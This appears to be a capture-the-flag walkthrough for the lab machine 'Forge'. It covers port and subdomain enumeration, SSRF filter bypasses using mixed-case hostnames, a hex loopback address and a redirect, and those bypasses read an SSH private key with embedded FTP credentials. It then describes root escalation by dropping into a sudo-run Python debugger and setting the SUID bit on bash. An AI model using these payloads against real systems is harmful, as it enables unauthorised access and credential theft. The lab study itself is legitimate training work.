## Forge

Difficulty: Medium

### User Flag

```
rustscan -a 10.10.11.111 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/d629b78c-bf20-48cd-8402-c73d492aa371)

<br>

The website has an upload image function that accepts images from URL.

![website](https://github.com/b1d0ws/OSCP/assets/58514930/287aacd2-7771-4cf0-851c-d4061442c42c)

![uploadSite](https://github.com/b1d0ws/OSCP/assets/58514930/7a1a09a1-1cc3-4398-8f88-59fe640f42f3)

<br>

Enumerating subdomain with fuff, we find admin.forge.htb, but this can only be accessed by localhost.

```
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.forge.htb" -u http://forge.htb

ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.forge.htb" -u http://forge.htb -fw 18
```

![ffuf](https://github.com/b1d0ws/OSCP/assets/58514930/a0a9c156-7fff-4c08-9258-978fe40a7dd4)

![adminForge](https://github.com/b1d0ws/OSCP/assets/58514930/057d0815-113e-40ba-8050-3baa41bff496)

<br>

In the url upload mode, we can bypass the blacklist by putting uppercase characters in the payload.  

With this bypass, we can download the SSH key and access the user. Just put the payloads above and access the results with curl.

```
http://adMin.foRge.hTb

http://adMin.foRge.hTb/announcements

http://adMin.foRge.hTb/upload?u=ftp://user:heightofsecurity123!@0x7f000001/.ssh/id_rsa
```

![bypassingFilterCaps](https://github.com/b1d0ws/OSCP/assets/58514930/ced25c0d-286b-44de-9c6c-9a2a8937c5a9)

![curlAdmin](https://github.com/b1d0ws/OSCP/assets/58514930/017a4aac-8d60-4c63-b77f-c2433461b839)

![announcementsCurl](https://github.com/b1d0ws/OSCP/assets/58514930/3fdd8df8-ee23-4769-b66d-520bebe507e0)

![gettingKey](https://github.com/b1d0ws/OSCP/assets/58514930/b795f31d-5791-4796-885f-e8ba6ce30798)

<br>

There is another method to bypass this blacklist. We can create a redirection request, set the location to the file we want and access via URL.

```
HTTP/1.1 301 MOVED PERMANENTLY
Location: http://admin.forge.htb/announcements](http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa)http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa
```

![REQmode](https://github.com/b1d0ws/OSCP/assets/58514930/d9802afd-bec1-493d-8783-6430eb678659)

![mode2](https://github.com/b1d0ws/OSCP/assets/58514930/e7e416bb-e00e-4677-956b-ab94403c6b23)

### Root Flag

Enumerating sudo -l we have permission to execute a python script with sudo.  

The scripts create a localhost connection and give some options after you insert a password. The password is cleartext on the script.

![sudo -l](https://github.com/b1d0ws/OSCP/assets/58514930/aa4085db-7687-4e09-92b8-27297bed9a92)

<br>

To exploit this, connect to the localhost in another terminal, force an error putting some string instead of an int and get access to python interactive mode.  

After that, you can just put the SUID Bit in /bin/bash with "os" library.

![gettingRoot](https://github.com/b1d0ws/OSCP/assets/58514930/858d0cc6-4650-4a96-b1ee-65a9eeb5444c)
